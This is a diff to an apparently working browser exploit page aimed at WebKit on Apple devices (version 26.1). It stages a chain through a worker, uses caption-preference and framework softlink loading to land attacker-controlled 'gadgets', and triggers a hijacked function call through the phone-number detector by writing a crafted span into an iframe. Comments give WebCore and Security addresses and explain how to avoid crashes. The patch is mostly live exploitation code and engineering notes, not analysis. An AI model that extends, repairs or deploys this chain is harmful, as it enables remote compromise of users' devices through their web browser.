@@ -219,11 +219,14 @@
         function log(output, cls) {
             beacon(cls || "log", output);
             if (window.__f7Verbose === false && String(output).startsWith("[dump thread]")) return;
+            const out = document.getElementById("output-list");
             const addline = document.createElement("div");
             if (cls) addline.className = cls;
             const ts = `[${new Date().toISOString().split("T")[1].split(".")[0]}] `;
             addline.textContent = (window.__f7Timestamps === false ? "" : ts) + output;
-            document.getElementById("output-list").appendChild(addline);
+            out.appendChild(addline);
+            // cap the panel: thousands of DOM nodes across repeated runs pile into real memory
+            while (out.childElementCount > 400) out.removeChild(out.firstElementChild);
             if (window.__f7AutoScroll !== false) addline.scrollIntoView();
             console.log(output);
         }
@@ -345,40 +348,19 @@ poller.postMessage({ type: 'stage1' });
                     } catch (e) { }
                 }
                 async function __pumpFire() {
-                    await __pumpPlay(1);                                  // WebCore media softlink (h264)
-                    await __pumpPlay(2);                                  // hevc decoder path
-                    try {                                                  // MediaAccessibility.framework (WebCore softlink, in-process):
-                        if (!window.__pumpCC) {                            // caption rendering loads it on first cue display
-                            window.__pumpCC = document.createElement('video');
-                            window.__pumpCC.muted = true; window.__pumpCC.playsInline = true; window.__pumpCC.loop = true;
-                            window.__pumpCC.src = __b64uri(PUMP_H264, 'video/mp4');
-                            const tr = document.createElement('track');
-                            tr.kind = 'captions'; tr.label = 'x'; tr.srclang = 'en'; tr.default = true;
-                            tr.src = 'data:text/vtt,' + encodeURIComponent("WEBVTT\n\n00:00.000 --> 00:59.000\nwake\n");
-                            window.__pumpCC.appendChild(tr);
-                            document.body.appendChild(window.__pumpCC);
-                        }
-                        await window.__pumpCC.play();
-                        const t = window.__pumpCC.textTracks[0]; if (t) t.mode = 'showing';
-                    } catch (e) { }
-                    try { await createImageBitmap(__b64blob(PUMP_AVIF, 'image/avif')); } catch (e) { }   // ImageIO codec plugin (in-process)
-                    try { await new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); } catch (e) { }   // ImageIO encoder plugin
-                    try { await new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/avif' }); } catch (e) { }
-                    try {                                                  // Vision.framework (in-process)
-                        const bd = new BarcodeDetector({ formats: ['qr_code'] });
-                        await bd.detect(await createImageBitmap(__b64blob(PUMP_AVIF, 'image/avif')));
-                    } catch (e) { }
-                    try {                                                  // audio stack
-                        if (!__pumpAC) __pumpAC = new (window.AudioContext || window.webkitAudioContext)();
-                        await __pumpAC.resume();
-                    } catch (e) { }
+                    // MEDIA BATTERY REMOVED (2026-07-19): §5 proved every JS-reachable fresh-load
+                    // path is exhausted on this device (loadedCount flat -> zero useful broadcasts),
+                    // so the looping videos/codecs/AudioContext were pure background contention +
+                    // memory pressure (the 9.8GB WebContent jetsam). The mapredir fire is the only
+                    // real wake source; the cheap one-shot sync window at pump_start stays as fallback.
                     try { await VideoDecoder.isConfigSupported({ codec: 'hev1.1.6.L120.90' }); } catch (e) { }
                 }
                 // window-only SYNCHRONOUS softlink battery (the writeup's alternative path):
                 // each call makes WebCore dlopen a fresh framework on the main thread, now.
                 function __pumpSyncWindow() {
                     try { navigator.getGamepads(); } catch (e) { }                                // GameController.framework
-                    try { new (window.SpeechRecognition || window.webkitSpeechRecognition)(); } catch (e) { }   // Speech.framework
+                    // SpeechRecognition REMOVED: Speech.framework drives the same AVSpeech* classes
+                    // that share the AVLoadSpeech onceToken -- instantiating it contends on that gate.
                     try { new (window.ManagedMediaSource || window.MediaSource)(); } catch (e) { }  // media private frameworks
                     try { window.addEventListener('devicemotion', () => { }); } catch (e) { }       // CoreMotion
                     try { navigator.mediaDevices && navigator.mediaDevices.enumerateDevices(); } catch (e) { }   // AVFoundation
@@ -434,6 +416,7 @@ poller.postMessage({ type: 'stage1' });
                 worker.onmessage = async function (event) {
                     const dataFromWorker = event.data;
                     log("Received back from worker:" + dataFromWorker);
+                    if (typeof dataFromWorker === 'string' && dataFromWorker.indexOf('fcall self-test PASSED') !== -1) { setStatus('fcall self-test PASSED'); }
                     if (dataFromWorker && typeof dataFromWorker === 'object') {
     switch (dataFromWorker.type) {
         case 'start_poll':
@@ -442,9 +425,74 @@ poller.postMessage({ type: 'stage1' });
             break;
         case 'pump_start': startBroadcastPump(); break;
         case 'pump_stop': stopBroadcastPump(); break;
-        case 'sign_pointers':          // chain posts this as an OBJECT — your string case never matched either
-            await new Promise(r => setTimeout(r, 500));
+        case 'sign_pointers':
+            // CAPTION CARRIER (26.1): addTextTrack() -> Document::registerForCaptionPreferencesChangedCallbacks
+            // -> setInterestedInCaptionPreferenceChanges() -> 0s timer -> captionsStyleSheetOverride()
+            // -> the MACaption CSS battery, incl. MACaptionAppearanceGetTextEdgeStyle via its softlink
+            // init wrapper -> its dlsym hits our interpose -> IIOLoadCMPhotoSymbols -> gFunc globals
+            // = GADGETS. GetTextEdgeStyle's garbage return is used as an integer ENUM -> benign (the
+            // DDDFA detector caller bounds-trapped on the same garbage, crash 071617). GetDisplayType
+            // is NOT used: on 26.1 CaptionDisplayMode is pinned Manual, so it never fires.
+            log('[page] sign_pointers: caption carrier (no detector scan)');
+            // detector-scan bisect (REAL unpatched slot): does document.write's detector scan even
+            // COMPLETE on 26.1? If it hangs here, the fcall's document.write trigger is broken on
+            // 26.1 independent of our gadget patch. If it completes, the scan works and the fcall
+            // hang is from the patched slot/gadget instead.
+            if (!window.__scanDiag) {
+                window.__scanDiag = 1;
+                const steps = [
+                    ['S1: contentDocument access', () => iframe.contentDocument ? 'ok' : (() => { throw 'no contentDocument'; })()],
+                    ['S2: write("x") no-digit (no detector)', () => iframe.contentDocument.write('x')],
+                    ['S3: write("1") single digit (detector scan)', () => iframe.contentDocument.write('1')],
+                    ['S4: write("5551212") phone-like (full scan)', () => iframe.contentDocument.write('5551212')],
+                ];
+                for (let i = 0; i < steps.length; i++) {
+                    log('[scan] ' + steps[i][0] + ' ...');
+                    try { steps[i][1](); log('[scan] ' + steps[i][0] + ' RETURNED'); }
+                    catch (e) { log('[scan] ' + steps[i][0] + ' ERR ' + e, 'fail'); }
+                }
+                log('[scan] bisect done (all steps returned)');
+            }
+            try {
+                let cv = document.getElementById('__capv');
+                if (!cv) {
+                    cv = document.createElement('video');
+                    cv.id = '__capv';
+                    cv.muted = true; cv.playsInline = true;
+                    cv.style.width = cv.style.height = '2px';
+                    cv.src = __b64uri(PUMP_H264, 'video/mp4');
+                    const t = cv.addTextTrack('captions', 'English', 'en');
+                    t.addCue(new VTTCue(0, 3600, 'wake'));
+                    document.body.appendChild(cv);
+                    t.mode = 'showing';
+                    cv.load();
+                    cv.play().catch(() => { });
+                }
+                void cv.offsetHeight;   // force style/layout so caption prefs resolve now
+            } catch (e) { log('[page] caption carrier ERR ' + e, 'fail'); }
+            await new Promise(r => setTimeout(r, 600));
+            // KILL the caption pipeline right after the resolution: the MACaption softlink global now
+            // points to IIOLoadCMPhotoSymbols (via the interpose), so a playing video keeps calling it
+            // -> re-running its full dlopen+dlsym loop on the main thread -> the main thread FREEZES
+            // (the fcall-era hang). Stop the video + disable the track so it can't re-invoke it.
+            try { const cv = document.getElementById('__capv'); if (cv) { cv.pause(); cv.removeAttribute('src'); cv.load(); const ts = cv.textTracks; for (const tr of ts) tr.mode = 'disabled'; cv.remove(); } log('[page] caption pipeline stopped post-resolution'); } catch (e) { }
             worker.postMessage({ type: 'stage7' });
+            break;
+        case 'slow_fcall':
+            log('[page] slow_fcall received');
+            // The write triggers TelephoneNumberDetector::find -> our planted slot -> gadget1 -> the
+            // target call. gadget1 returns cset(result!=0): on a successful call find()=1, and 26.1's
+            // processCharacterBufferForInBody then walks ancestors checking
+            // getAttributeInternal(el, "data-mime-type").startsWith("text/latex") (WebCore 0x1a0ac25cc-
+            // 0x1a0ac2630). MATCH takes the plain-insertTextNode path (0x1a0ac27c0) which NEVER reads
+            // find()'s out-params; NO match falls to the linkify path (0x1a0ac26a8) which reads the
+            // garbage out-params and hits brk #1 at +0x6ac (the observed fcall death). So the trigger
+            // text MUST live inside a data-mime-type="text/latex" element. gadget1's fast path
+            // (Security 0x1888d9b94) touches only x8/x9/x19/x20 and the ABI preserves x22=1 through
+            // the called pc, so the tbz w22,#0 gate at 0x1a0ac25ac falls through to the walk as
+            // required.
+            try { iframe.contentDocument.write('<span data-mime-type="text/latex">1</span>'); log('[page] iframe write RETURNED (fcall path completed on main thread)'); } catch (e) { log('[page] iframe write ERR ' + e, 'fail'); }
+            worker.postMessage({ type: 'slow_fcall_done' });
             break;
         default:
             log('[page] unhandled object message: ' + JSON.stringify(dataFromWorker));
